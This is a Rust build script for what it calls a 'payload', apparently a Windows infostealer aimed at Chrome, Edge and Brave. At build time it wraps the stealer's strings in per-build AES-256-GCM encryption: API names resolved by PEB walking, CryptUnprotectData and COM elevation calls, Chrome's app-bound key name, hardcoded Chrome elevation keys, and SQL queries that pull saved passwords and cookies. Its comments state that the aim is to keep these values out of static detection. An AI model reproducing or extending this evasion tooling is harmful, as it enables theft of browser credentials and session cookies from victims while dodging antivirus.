use std::{env, fs, path::PathBuf};

fn aes256gcm_encrypt(plaintext: &[u8], key: &[u8; 32]) -> (Vec<u8>, [u8; 12]) {
    use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};
    let nonce_bytes: [u8; 12] = {
        let mut buf = [0u8; 12];
        for (i, b) in buf.iter_mut().enumerate() {
            *b = (i as u8)
                .wrapping_add(key[i % 32])
                .wrapping_mul(0x6D)
                .wrapping_add(0x4F);
        }
        buf
    };
    let cipher = Aes256Gcm::new_from_slice(key).expect("key len");
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ct = cipher.encrypt(nonce, plaintext).expect("aes encrypt");
    (ct, nonce_bytes)
}

fn rand_key(seed: u64) -> [u8; 32] {
    let mut key = [0u8; 32];
    let mut x = seed ^ 0xDEAD_BEEF_CAFE_F00D;
    for b in key.iter_mut() {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        *b = (x & 0xFF) as u8;
    }
    key
}

fn time_seed() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0x13374242DEADBEEF)
        ^ (std::process::id() as u64).wrapping_mul(0x9E3779B97F4A7C15)
}

fn fmt_key_array(name: &str, key: &[u8; 32]) -> String {
    let hex: Vec<String> = key.iter().map(|b| format!("0x{:02X}", b)).collect();
    format!("pub static {name}_KEY: [u8; 32] = [{}];", hex.join(", "))
}

fn fmt_nonce_array(name: &str, nonce: &[u8; 12]) -> String {
    let hex: Vec<String> = nonce.iter().map(|b| format!("0x{:02X}", b)).collect();
    format!("pub static {name}_NONCE: [u8; 12] = [{}];", hex.join(", "))
}

fn fmt_ct_slice(name: &str, ct: &[u8]) -> String {
    let hex: Vec<String> = ct.iter().map(|b| format!("0x{:02X}", b)).collect();
    format!("pub static {name}_CT: &[u8] = &[{}];", hex.join(", "))
}

fn main() {
    println!("cargo:rustc-link-lib=ole32");
    println!("cargo:rustc-link-lib=oleaut32");

    let out_dir = PathBuf::from(env::var("OUT_DIR").expect("OUT_DIR"));

    let base_seed = time_seed();

    // All strings that were previously XOR-encoded in the payload
    let strings: &[(&str, &str)] = &[
        ("K32_DLL",         "kernel32.dll"),
        ("CREATE_THREAD",   "CreateThread"),
        ("APPDATA_ENV",     "APPDATA"),
        ("LOCAL_ENV",       "LOCALAPPDATA"),
        ("LOCAL_STATE",     "Local State"),
        ("APP_BOUND_KEY",   "app_bound_encrypted_key"),
        ("RESULT_ENV",      "CHROME_RECOVERY_RESULT"),
        ("USER_DATA_ENV",   "CHROME_RECOVERY_USER_DATA_REL"),
        ("DATA_ROOT_ENV",   "CHROME_RECOVERY_DATA_ROOT"),
        ("CHROME_CLSID_ENV","CHROME_RECOVERY_CLSID"),
        // JSON output keys — no plaintext key names in the binary
        ("JSON_KEY_BROWSER",  "browser"),
        ("JSON_KEY_MASTER",   "master_key_hex"),
        ("JSON_KEY_ERROR",    "error"),
        // Fallback result path when env var is absent
        ("RESULT_FALLBACK",   "chrome_recovery_result.json"),
        // Core kernel exports resolved via PEB walking
        ("API_LOAD_LIBRARY",        "LoadLibraryA"),
        ("API_GET_PROC",            "GetProcAddress"),
        ("API_LOCAL_FREE",          "LocalFree"),
        ("API_CRYPT_UNPROTECT",     "CryptUnprotectData"),
        ("DLL_CRYPT32",             "crypt32.dll"),
        // DLL names resolved at runtime — not visible as plaintext
        ("DLL_OLE32",       "ole32.dll"),
        ("DLL_OLEAUT32",    "oleaut32.dll"),
        ("DLL_KERNEL32",    "kernel32.dll"),
        // COM API names — resolved via GetProcAddress at runtime
        ("API_CO_INIT",     "CoInitializeEx"),
        ("API_CO_UNINIT",   "CoUninitialize"),
        ("API_CO_CREATE",   "CoCreateInstance"),
        ("API_CO_PROXY",    "CoSetProxyBlanket"),
        ("API_SYS_ALLOC",   "SysAllocStringByteLen"),
        ("API_SYS_FREE",    "SysFreeString"),
        ("API_SYS_LEN",     "SysStringByteLen"),
        // Browser exe names for CLSID selection
        ("EXE_EDGE",        "msedge.exe"),
        ("EXE_BRAVE",       "brave.exe"),
        ("EXE_CHROME",      "chrome.exe"),
        // Chrome variant path fragments
        ("CHROME_SXS",      "chrome sxs"),
        ("CHROME_SXS_PATH", "\\sxs\\"),
        ("CHROME_DEV",      "chrome dev"),
        ("CHROME_BETA",     "chrome beta"),
        // Temp DB filenames
        ("TMPDB_LOGIN",     "chrome_login_data_tmp.db"),
        ("TMPDB_COOKIES",   "chrome_cookies_tmp.db"),
    ];

    // dtb.rs strings (SQLite queries + filenames)
    let dtb_strings: &[(&str, &str)] = &[
        ("LOGIN_DATA",    "Login Data"),
        ("SQL_PASSWORDS", "SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL AND password_value <> ''"),
        ("SQL_COOKIES",   "SELECT host_key, name, encrypted_value, path FROM cookies WHERE encrypted_value IS NOT NULL AND encrypted_value <> '' ORDER BY host_key, name LIMIT 5000"),
        ("NETWORK",       "Network"),
        ("COOKIES",       "Cookies"),
    ];

    let mut lines = vec![
        "// AUTO-GENERATED by payload/build.rs — DO NOT EDIT".to_string(),
        "// AES-256-GCM encrypted strings, unique per build".to_string(),
        String::new(),
        "use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};".to_string(),
        String::new(),
        "pub fn aes_dec(ct: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {".to_string(),
        "    let cipher = unsafe { Aes256Gcm::new_from_slice(key).unwrap_unchecked() };".to_string(),
        "    let n = Nonce::from_slice(nonce);".to_string(),
        "    cipher.decrypt(n, ct).unwrap_or_default()".to_string(),
        "}".to_string(),
        String::new(),
        "pub fn aes_str(ct: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> String {".to_string(),
        "    String::from_utf8(aes_dec(ct, key, nonce)).unwrap_or_default()".to_string(),
        "}".to_string(),
        String::new(),
    ];

    for (i, (name, plaintext)) in strings.iter().enumerate() {
        let key = rand_key(base_seed.wrapping_add((i as u64).wrapping_mul(0x1234567890ABCDEF)));
        let (ct, nonce) = aes256gcm_encrypt(plaintext.as_bytes(), &key);
        lines.push(fmt_key_array(name, &key));
        lines.push(fmt_nonce_array(name, &nonce));
        lines.push(fmt_ct_slice(name, &ct));
        lines.push(String::new());
    }

    let aes_path = out_dir.join("payload_aes_strings.rs");
    fs::write(&aes_path, lines.join("\n") + "\n").expect("write payload_aes_strings.rs");

    // Generate dtb_aes_strings.rs
    let mut dtb_lines = vec![
        "// AUTO-GENERATED by payload/build.rs — DO NOT EDIT".to_string(),
        "// AES-256-GCM encrypted strings for dtb.rs, unique per build".to_string(),
        String::new(),
    ];
    let dtb_base_seed = base_seed.wrapping_add(0xFEDCBA9876543210);
    for (i, (name, plaintext)) in dtb_strings.iter().enumerate() {
        let key = rand_key(dtb_base_seed.wrapping_add((i as u64).wrapping_mul(0xABCDEF0123456789)));
        let (ct, nonce) = aes256gcm_encrypt(plaintext.as_bytes(), &key);
        dtb_lines.push(fmt_key_array(name, &key));
        dtb_lines.push(fmt_nonce_array(name, &nonce));
        dtb_lines.push(fmt_ct_slice(name, &ct));
        dtb_lines.push(String::new());
    }
    let dtb_path = out_dir.join("dtb_aes_strings.rs");
    fs::write(&dtb_path, dtb_lines.join("\n") + "\n").expect("write dtb_aes_strings.rs");

    // Wrap dpflbck.rs hardcoded keys in AES so they don't appear as static byte patterns.
    // These are Chrome's internal protocol keys — values must stay exact, only the
    // static visibility is reduced.
    let aes_elev_key: &[u8; 32] = &[
        0xB3, 0x1C, 0x6E, 0x24, 0x1A, 0xC8, 0x46, 0x72, 0x8D, 0xA9, 0xC1, 0xFA, 0xC4, 0x93, 0x66,
        0x51, 0xCF, 0xFB, 0x94, 0x4D, 0x14, 0x3A, 0xB8, 0x16, 0x27, 0x6B, 0xCC, 0x6D, 0xA0, 0x28,
        0x47, 0x87,
    ];
    let chacha_elev_key: &[u8; 32] = &[
        0xE9, 0x8F, 0x37, 0xD7, 0xF4, 0xE1, 0xFA, 0x43, 0x3D, 0x19, 0x30, 0x4D, 0xC2, 0x25, 0x80,
        0x42, 0x09, 0x0E, 0x2D, 0x1D, 0x7E, 0xEA, 0x76, 0x70, 0xD4, 0x1F, 0x73, 0x8D, 0x08, 0x72,
        0x96, 0x60,
    ];
    let dpf_seed = base_seed.wrapping_add(0xCAFEBABE12345678);
    let wrap_key_aes  = rand_key(dpf_seed);
    let wrap_key_chch = rand_key(dpf_seed.wrapping_add(0x1111111111111111));
    let (aes_ct,   aes_nonce)   = aes256gcm_encrypt(aes_elev_key,   &wrap_key_aes);
    let (chch_ct,  chch_nonce)  = aes256gcm_encrypt(chacha_elev_key, &wrap_key_chch);

    fn fmt_key32(name: &str, key: &[u8; 32]) -> String {
        let hex: Vec<String> = key.iter().map(|b| format!("0x{:02X}", b)).collect();
        format!("pub static {name}: [u8; 32] = [{}];", hex.join(", "))
    }
    fn fmt_nonce12(name: &str, n: &[u8; 12]) -> String {
        let hex: Vec<String> = n.iter().map(|b| format!("0x{:02X}", b)).collect();
        format!("pub static {name}: [u8; 12] = [{}];", hex.join(", "))
    }
    fn fmt_slice(name: &str, d: &[u8]) -> String {
        let hex: Vec<String> = d.iter().map(|b| format!("0x{:02X}", b)).collect();
        format!("pub static {name}: &[u8] = &[{}];", hex.join(", "))
    }

    let dpf_lines = vec![
        "// AUTO-GENERATED by payload/build.rs — DO NOT EDIT".to_string(),
        "// Chrome internal keys wrapped in per-build AES-256-GCM".to_string(),
        String::new(),
        "use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};".to_string(),
        String::new(),
        "pub fn unwrap_key32(ct: &[u8], wrap: &[u8; 32], n: &[u8; 12]) -> [u8; 32] {".to_string(),
        "    let cipher = unsafe { Aes256Gcm::new_from_slice(wrap).unwrap_unchecked() };".to_string(),
        "    let plain = cipher.decrypt(Nonce::from_slice(n), ct).unwrap_or_default();".to_string(),
        "    let mut out = [0u8; 32];".to_string(),
        "    let len = plain.len().min(32);".to_string(),
        "    out[..len].copy_from_slice(&plain[..len]);".to_string(),
        "    out".to_string(),
        "}".to_string(),
        String::new(),
        fmt_key32("AES_ELEV_WRAP_KEY", &wrap_key_aes),
        fmt_nonce12("AES_ELEV_WRAP_NONCE", &aes_nonce),
        fmt_slice("AES_ELEV_KEY_CT", &aes_ct),
        String::new(),
        fmt_key32("CHACHA_ELEV_WRAP_KEY", &wrap_key_chch),
        fmt_nonce12("CHACHA_ELEV_WRAP_NONCE", &chch_nonce),
        fmt_slice("CHACHA_ELEV_KEY_CT", &chch_ct),
    ];
    let dpf_path = out_dir.join("dpflbck_keys.rs");
    fs::write(&dpf_path, dpf_lines.join("\n") + "\n").expect("write dpflbck_keys.rs");

    println!("cargo:rerun-if-env-changed=PAYLOAD_INTERNAL_XOR_KEY");
}
